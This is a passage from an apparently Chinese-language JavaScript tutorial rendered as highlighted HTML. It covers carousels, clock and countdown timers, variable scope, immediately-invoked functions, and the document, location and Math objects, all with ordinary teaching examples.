<span class="selector-tag">left</span><span class="selector-pseudo">:1010px</span>;            </span></span><br><span class="line"><span class="css">            <span class="selector-tag">top</span><span class="selector-pseudo">:124px</span>;          </span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> oDiv = <span class="built_in">document</span>.getElementById(<span class="string">'slide'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> oBtn01 = <span class="built_in">document</span>.getElementById(<span class="string">'btn01'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> oBtn02 = <span class="built_in">document</span>.getElementById(<span class="string">'btn02'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="comment">//通过标签获取元素，获取的是选择集，加上下标才能获取到元素          </span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> oUl = oDiv.getElementsByTagName(<span class="string">'ul'</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> iLeft = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> iSpeed = <span class="number">-2</span>;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> iNowspeed = <span class="number">0</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="comment">//将ul里面的内容复制一份，整个ul里面就包含了10个li</span></span></span><br><span class="line"><span class="undefined">            oUl.innerHTML = oUl.innerHTML + oUl.innerHTML;  </span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">moving</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">                iLeft += iSpeed;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">                <span class="comment">// 当ul向左滚动到第5个li时，瞬间将整个ul拉回到初始位置</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span>(iLeft&lt;<span class="number">-1000</span>)</span></span><br><span class="line"><span class="undefined">                &#123;</span></span><br><span class="line"><span class="undefined">                    iLeft=0;</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="javascript">                <span class="comment">//当ul在起始位置往右滚动时候，瞬间将整个ul拉回到往左的第5个li的位置</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span>(iLeft&gt;<span class="number">0</span>)</span></span><br><span class="line"><span class="undefined">                &#123;</span></span><br><span class="line"><span class="undefined">                    iLeft = -1000;</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">                oUl.style.left = iLeft + <span class="string">'px'</span>;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> timer = setInterval(moving,<span class="number">30</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            oBtn01.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">                iSpeed = -2;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            oBtn02.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">                iSpeed = 2;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 当鼠标移入的时候</span></span></span><br><span class="line"><span class="javascript">            oDiv.onmouseover = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">                iNowspeed = iSpeed;</span></span><br><span class="line"><span class="undefined">                iSpeed = 0;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 当鼠标移出的时候</span></span></span><br><span class="line"><span class="javascript">            oDiv.onmouseout = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">                iSpeed = iNowspeed;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btns_con"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span> <span class="attr">id</span>=<span class="string">"btn01"</span>&gt;</span>&amp;lt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span> <span class="attr">id</span>=<span class="string">"btn02"</span>&gt;</span>&amp;gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list_con"</span> <span class="attr">id</span>=<span class="string">"slide"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"images/goods001.jpg"</span> <span class="attr">alt</span>=<span class="string">"商品图片"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"images/goods002.jpg"</span> <span class="attr">alt</span>=<span class="string">"商品图片"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"images/goods003.jpg"</span> <span class="attr">alt</span>=<span class="string">"商品图片"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"images/goods004.jpg"</span> <span class="attr">alt</span>=<span class="string">"商品图片"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"images/goods005.jpg"</span> <span class="attr">alt</span>=<span class="string">"商品图片"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span>       </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3、定时器制作时钟</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">        <span class="keyword">var</span> oDiv = <span class="built_in">document</span>.getElementById(<span class="string">'div1'</span>);</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">timego</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> now = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">            <span class="keyword">var</span> year = now.getFullYear();</span><br><span class="line">            <span class="keyword">var</span> month = now.getMonth()+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">var</span> date = now.getDate();</span><br><span class="line">            <span class="keyword">var</span> week = now.getDay();</span><br><span class="line">            <span class="keyword">var</span> hour = now.getHours();</span><br><span class="line">            <span class="keyword">var</span> minute = now.getMinutes();</span><br><span class="line">            <span class="keyword">var</span> second = now.getSeconds();</span><br><span class="line">            <span class="keyword">var</span> str = <span class="string">'当前时间是：'</span>+ year + <span class="string">'年'</span>+month+<span class="string">'月'</span>+date+<span class="string">'日 '</span>+toweek(week)+<span class="string">' '</span>+todou(hour)+<span class="string">':'</span>+todou(minute)+<span class="string">':'</span>+todou(second);</span><br><span class="line">            oDiv.innerHTML = str;</span><br><span class="line">        &#125;</span><br><span class="line">        timego();</span><br><span class="line">        setInterval(timego,<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">toweek</span>(<span class="params">n</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'星期日'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'星期一'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'星期二'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'星期三'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'星期四'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">5</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'星期五'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'星期六'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">todou</span>(<span class="params">n</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;<span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'0'</span>+n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">......</span></span><br><span class="line"><span class="regexp">&lt;div id="div1"&gt;&lt;/</span>div&gt;</span><br></pre></td></tr></table></figure><p>4、定时器制作倒计时</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> oDiv = <span class="built_in">document</span>.getElementById(<span class="string">'div1'</span>);</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">timeleft</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> now = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">            <span class="keyword">var</span> future = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2016</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">var</span> lefts = <span class="built_in">parseInt</span>((future-now)/<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">var</span> day = <span class="built_in">parseInt</span>(lefts/<span class="number">86400</span>);</span><br><span class="line">            <span class="keyword">var</span> hour = <span class="built_in">parseInt</span>(lefts%<span class="number">86400</span>/<span class="number">3600</span>);</span><br><span class="line">            <span class="keyword">var</span> min = <span class="built_in">parseInt</span>(lefts%<span class="number">86400</span>%<span class="number">3600</span>/<span class="number">60</span>);</span><br><span class="line">            <span class="keyword">var</span> sec = lefts%<span class="number">60</span>;</span><br><span class="line">            str = <span class="string">'距离2016年9月12日晚24点还剩下'</span>+day+<span class="string">'天'</span>+hour+<span class="string">'时'</span>+min+<span class="string">'分'</span>+sec+<span class="string">'秒'</span>;</span><br><span class="line">            oDiv.innerHTML = str; </span><br><span class="line">        &#125;</span><br><span class="line">        timeleft();</span><br><span class="line">        setInterval(timeleft,<span class="number">1000</span>);        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">......</span></span><br><span class="line"><span class="regexp">&lt;div id="div1"&gt;&lt;/</span>div&gt;</span><br></pre></td></tr></table></figure><h2 id="9-16-变量作用域"><a href="#9-16-变量作用域" class="headerlink" title="9.16 变量作用域"></a>9.16 变量作用域</h2><p>变量作用域指的是变量的作用范围，javascript中的变量分为全局变量和局部变量。</p><p>1、全局变量：在函数之外定义的变量，为整个页面公用，函数内部外部都可以访问。<br>2、局部变量：在函数内部定义的变量，只能在定义该变量的函数内部访问，外部无法访问。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="comment">//全局变量</span></span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">12</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myalert</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//局部变量</span></span><br><span class="line">        <span class="keyword">var</span> b = <span class="number">23</span>;</span><br><span class="line">        alert(a);</span><br><span class="line">        alert(b);</span><br><span class="line">    &#125;</span><br><span class="line">    myalert(); <span class="comment">//弹出12和23</span></span><br><span class="line">    alert(a);  <span class="comment">//弹出12    </span></span><br><span class="line">    alert(b);  <span class="comment">//出错</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-17-封闭函数"><a href="#9-17-封闭函数" class="headerlink" title="9.17 封闭函数"></a>9.17 封闭函数</h2><p>封闭函数是javascript中匿名函数的另外一种写法，创建一个一开始就执行而不用命名的函数。</p><p>一般定义的函数和执行函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myalert</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">'hello!'</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">myalert();</span><br></pre></td></tr></table></figure><p>封闭函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">myalert</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">'hello!'</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>还可以在函数定义前加上“~”和“!”等符号来定义匿名函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!<span class="function"><span class="keyword">function</span> <span class="title">myalert</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">'hello!'</span>);</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><h3 id="9-17-1-封闭函数的好处"><a href="#9-17-1-封闭函数的好处" class="headerlink" title="9.17.1 封闭函数的好处"></a>9.17.1 <strong>封闭函数的好处</strong></h3><p>封闭函数可以创造一个独立的空间，在封闭函数内定义的变量和函数不会影响外部同名的函数和变量，可以避免命名冲突，在页面上引入多个js文件时，用这种方式添加js文件比较安全，比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> iNum01 = <span class="number">12</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myalert</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">'hello!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> iNum01 = <span class="number">24</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myalert</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(<span class="string">'hello!world'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    alert(iNum01);</span><br><span class="line">    myalert()</span><br><span class="line">&#125;)()</span><br><span class="line">alert(iNum01);</span><br><span class="line">myalert();</span><br></pre></td></tr></table></figure><h2 id="9-18-常用内置对象"><a href="#9-18-常用内置对象" class="headerlink" title="9.18 常用内置对象"></a>9.18 常用内置对象</h2><p>1、document</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById <span class="comment">//通过id获取元素</span></span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName <span class="comment">//通过标签名获取元素</span></span><br><span class="line"><span class="built_in">document</span>.referrer  <span class="comment">//获取上一个跳转页面的地址(需要服务器环境)</span></span><br></pre></td></tr></table></figure><p>2、location<br></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location.href  <span class="comment">//获取或者重定url地址</span></span><br><span class="line"><span class="built_in">window</span>.location.search <span class="comment">//获取地址参数部分</span></span><br><span class="line"><span class="built_in">window</span>.location.hash <span class="comment">//获取页面锚点或者叫哈希值</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 存储上一个页面的地址</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> sUrl = <span class="built_in">document</span>.referrer;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> oBtn = <span class="built_in">document</span>.getElementById(<span class="string">"btn01"</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        oBtn.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.location.href = <span class="string">"http://www.baidu.com"</span>;</span></span><br><span class="line"><span class="undefined">        &#125;;</span></span><br><span class="line"><span class="javascript">        alert(<span class="built_in">window</span>.location.search);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"btn01"</span> <span class="attr">value</span>=<span class="string">"跳转"</span> <span class="attr">name</span>=<span class="string">""</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>课堂练习</strong><br>通过地址栏的参数改变页面状态，如下的示例是通过地址栏中的参数改变页面背景色</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> oBody01 = <span class="built_in">document</span>.getElementById(<span class="string">"body01"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> sData = <span class="built_in">window</span>.location.search;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (sData != <span class="string">''</span>) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> iNum = sData.split(<span class="string">"="</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="javascript">                 <span class="comment">// console.log(iNum);</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (iNum == <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">                    oBody01.style.backgroundColor = <span class="string">"red"</span>;</span></span><br><span class="line"><span class="javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                    oBody01.style.backgroundColor = <span class="string">"pink"</span>;</span></span><br><span class="line"><span class="undefined">                &#125;;</span></span><br><span class="line"><span class="undefined">            &#125;;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">"body01"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"btn01"</span> <span class="attr">value</span>=<span class="string">"跳转"</span> <span class="attr">name</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3、Math</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Math</span>.random 获取<span class="number">0</span><span class="number">-1</span>的随机数</span><br><span class="line"><span class="built_in">Math</span>.floor 向下取整</span><br><span class="line"><span class="built_in">Math</span>.ceil 向上取整</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="comment">// var iPi = Math.PI;</span></span><br><span class="line">    <span class="comment">// alert(iPi);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> sList = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// Math.random 返回0到1之间的随机数,不包括1</span></span><br><span class="line">        <span class="keyword">var</span> iNum = <span class="built_in">Math</span>.random();</span><br><span class="line">        sList.push(iNum);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="built_in">console</span>.log(sList);</span><br><span class="line"></span><br><span class="line">    alert(<span class="built_in">Math</span>.floor(<span class="number">5.6</span>)); <span class="comment">// 向下取整，结果是5</span></span><br><span class="line">    alert(<span class="built_in">Math</span>.ceil(<span class="number">5.2</span>));  <span class="comment">// 向上取整，结果是6</span></span><br><span class="line">&lt;<span 